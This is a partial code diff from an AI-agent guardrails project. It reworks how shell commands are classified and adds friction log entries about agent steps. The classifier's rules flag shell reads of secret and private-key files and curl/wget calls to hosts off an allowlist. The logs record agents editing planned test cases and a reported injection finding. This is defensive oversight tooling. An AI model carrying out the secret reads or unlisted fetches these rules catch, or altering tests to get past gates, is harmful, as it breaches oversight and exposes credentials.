+  const st = newEvidence(ctx);
+  let text = String(cmd);
+  if (Buffer.byteLength(text, "utf8") > EVIDENCE_LIMITS.commandBytes) {
+    text = text.slice(0, EVIDENCE_LIMITS.commandBytes);
+    evidenceLimit(st, "command-size", false);
+  }
+  try {
+    evalItems(lexShell(text, st, 0), st, 0, st.baseCwd);
+  } catch {
+    st.uncertain.add("unknown-script-effect");
+  }
+  return { targets: st.targets, uncertain: [...st.uncertain], limit: st.limit };
+}
+
+/** True when the evidence has anything to report. */
+function hasEditEvidence(ev) {
+  return Boolean(ev) && (ev.targets.length > 0 || ev.uncertain.length > 0 || Boolean(ev.limit));
 }
 
 /** Shared advisory string, identical on every host. */
-function shellEditAdvisory(hits) {
-  return (
-    `bkit guardrails: this command edits files through the shell (${hits.join("; ")}). The command is allowed. ` +
-    "Pre-edit gates see only the edit and write tools, so a shell edit gets past every one of them.\n" +
-    "Use the edit or write tool instead.\n" +
-    "If this is one of the exceptions in .agents/rules.md (generating files from a script, a bulk mechanical rewrite, or appending a log line to your own step output file with `>>`), proceed."
+function shellEditAdvisory(ev) {
+  const named = ev.targets.length > 0;
+  const lines = [
+    named
+      ? `bkit guardrails: this command edits files through the shell (targets: ${ev.targets.join(", ")}). The command is allowed.`
+      : "bkit guardrails: this command may edit files through the shell. The command is allowed.",
+    "Pre-edit gates see only the edit and write tools, so a shell edit gets past every one of them.",
+  ];
+  if (ev.uncertain.length > 0) {
+    lines.push(
+      `Some targets cannot be determined (${ev.uncertain.map((r) => EVIDENCE_REASONS[r] || r).join("; ")}). The authoring rules in .bkit/authoring.md still apply to every file this command may write.`,
+    );
+  }
+  if (ev.limit) {
+    lines.push(
+      `Analysis limit reached (${LIMIT_REASONS[ev.limit] || ev.limit}); the targets listed were found before it, and later ones were not examined.`,
+    );
+  }
+  lines.push(
+    "Use the edit or write tool instead.",
+    "If this is one of the exceptions in .agents/rules.md (generating files from a script, a bulk mechanical rewrite, or appending a log line to your own step output file with `>>`), proceed.",
   );
+  return lines.join("\n");
 }
 
 /** Repo-relative path of the install-written network allowlist every host's hook reads. */
diff --git a/.bkit/core/hooks/guardrails-tiers.js b/.bkit/core/hooks/guardrails-tiers.js
index 1d13637d4..7e2cd2629 100644
--- a/.bkit/core/hooks/guardrails-tiers.js
+++ b/.bkit/core/hooks/guardrails-tiers.js
@@ -266,12 +266,15 @@ function shellSecretRead(c) {
  *   `{ tier: "deny", what, fix }` — blocked on every host;
  *   `{ tier: "ask", what }`       — a destructive / privileged command;
  *   `{ tier: "secret", path }`    — a shell read of an env / secrets / private-key file;
- *   `{ tier: "fetch" }`           — curl / wget to a host off the network allowlist;
+ *   `{ tier: "fetch", edits? }`   — curl / wget to a host off the network allowlist, with the
+ *                                   edit evidence of the same command when it has any;
  *   `{ tier: "edit", edits }`     — the shell used as an edit channel (advisory only);
  *   null                          — nothing to say.
- * `dirs` locate the network allowlist (`hookDirs`).
+ * An allowed fetch never hides an edit in the same command. `edits` is the evidence from
+ * `shellEditTargets`. `dirs` locate the network allowlist (`hookDirs`); `ctx` is the call's
+ * `{ cwd, root }` (`hookContext`) that edit targets resolve against.
  */
-function classifyShell(c, dirs) {
+function classifyShell(c, dirs, ctx) {
   if (!c) return null;
   const denied = denyRule(c);
   if (denied) return { tier: "deny", ...denied };
@@ -279,7 +282,9 @@ function classifyShell(c, dirs) {
   if (what) return { tier: "ask", what };
   const secret = shellSecretRead(c);
   if (secret) return { tier: "secret", path: secret };
-  if (usesFetch(c)) return curlWgetHostAllowed(c, dirs) ? null : { tier: "fetch" };
-  const edits = shellEditTargets(c);
-  return edits.length > 0 ? { tier: "edit", edits } : null;
+  const offList = usesFetch(c) && !curlWgetHostAllowed(c, dirs);
+  const edits = shellEditTargets(c, ctx);
+  const found = hasEditEvidence(edits);
+  if (offList) return found ? { tier: "fetch", edits } : { tier: "fetch" };
+  return found ? { tier: "edit", edits } : null;
 }
diff --git a/.bkit/friction.jsonl b/.bkit/friction.jsonl
index 35ef20032..1c79ce10f 100644
--- a/.bkit/friction.jsonl
+++ b/.bkit/friction.jsonl
@@ -94,3 +94,5 @@
 {"schema":3,"ts":1794127014267,"kind":"friction","key":"challenge-merge-dedupe-by-location-drops-distinct-finding","repo":"cbartens/bkit","bkit":{"version":"6.1.1"},"by":{"workflow":"build","step":"build-challenge"},"references":["719-cloud-variants-add",".bkit/core/engine/commands/workflow/challenge.ts"],"category":"workflow","scope":"universal","severity":"HIGH","summary":"challenge merge dedupes findings by path:line, so two different findings at one line collapse into one","description":"mergeFindings keys on location only. In 719 round 2 the bug reviewer's architectural finding (which copy of bkit.cloud.agent wins) and the security reviewer's GITHUB_OUTPUT injection finding (multi-line bkit.cloud.agent starts every agent job) both pointed at bkit-cloud.yml:225. The merge kept the first, marked it Fixable: false, and the security finding's DONE WHEN and TEST FIRST vanished from the plan with dropped: 0. The orchestrator caught it only by reading both reports against the appended tasks. Dedupe should key on location plus finding text, or keep both blocks and only merge exact duplicates."}
 {"schema":3,"ts":1794127027655,"kind":"friction","key":"owner-pause/build.decision","repo":"cbartens/bkit","bkit":{"version":"6.0.0"},"by":{"workflow":"build","step":"owner-pause"},"category":"human-confirm","scope":"bkit-repo","severity":"LOW","summary":"build paused for the owner at build.decision","description":"The build workflow stopped and asked the owner (`owner-pause` at build.decision).","source":"orchestrator","status":"OPEN","run":{"parentSha":"2fa3c402b5dd5e8b6637a36a686dfad63d87b394"},"recurrenceCount":5,"lastConfirmed":1794127027655}
 {"schema":3,"ts":1794144464244,"kind":"friction","key":"owner-pause/ship.merge","repo":"cbartens/bkit","bkit":{"version":"6.1.1"},"by":{"workflow":"ship","step":"owner-pause"},"category":"human-confirm","scope":"bkit-repo","severity":"LOW","summary":"ship paused for the owner at ship.merge","description":"The ship workflow stopped and asked the owner (`owner-pause` at ship.merge).","source":"orchestrator","status":"OPEN","run":{"parentSha":"d773afab362f8801079ad42740dd5a5836cb19db"},"recurrenceCount":1}
+{"schema":3,"ts":1794215105366,"kind":"friction","key":"steps-finish/build-plan-tasks","repo":"cbartens/bkit","bkit":{"version":"6.0.0"},"by":{"workflow":"build","step":"build-plan-tasks"},"category":"agent-rework","scope":"bkit-repo","severity":"LOW","summary":"a code step edited a planned test case","description":"`bkit steps finish` refused build-plan-tasks with exit 11: `.bkit/core/engine/commands/workflow/tracker.test.ts` \"edits by verified comment id through each existing transport\", `.bkit/core/engine/commands/workflow/tracker.test.ts` \"seals unavailable or unstable representation evidence\", `.bkit/core/engine/commands/workflow/tracker.test.ts` \"uses accepted final preflight eligibility without provider atomicity\", `.bkit/core/engine/commands/workflow/tracker.test.ts` \"refuses aggregation with an unverified provider budget\" changed after the group's red; the step reruns.","source":"orchestrator","status":"OPEN","run":{"parentSha":"5834934f4a050b24979f75e161c9017d284733a2"},"recurrenceCount":3,"lastConfirmed":1794215105366}
+{"schema":3,"ts":1794216719524,"kind":"friction","key":"steps-finish/build-plan-gaps-remediate","repo":"cbartens/bkit","bkit":{"version":"6.1.1"},"by":{"workflow":"build","step":"build-plan-gaps-remediate"},"category":"agent-rework","scope":"bkit-repo","severity":"LOW","summary":"a code step edited a planned test case","description":"`bkit steps finish` refused build-plan-gaps-remediate with exit 11: `.bkit/core/engine/audits/hooks/gateguard-opencode.test.ts` \"acknowledges only complete selected blocks on verified routes\", `.bkit/core/engine/audits/hooks/gateguard-opencode.test.ts` \"reserves notices inside conservative host budgets\" changed after the group's red; the step reruns.","source":"orchestrator","status":"OPEN","run":{"parentSha":"efc2e5a5eaf9dac459eebceed27d170bd50f5066"},"recurrenceCount":1}
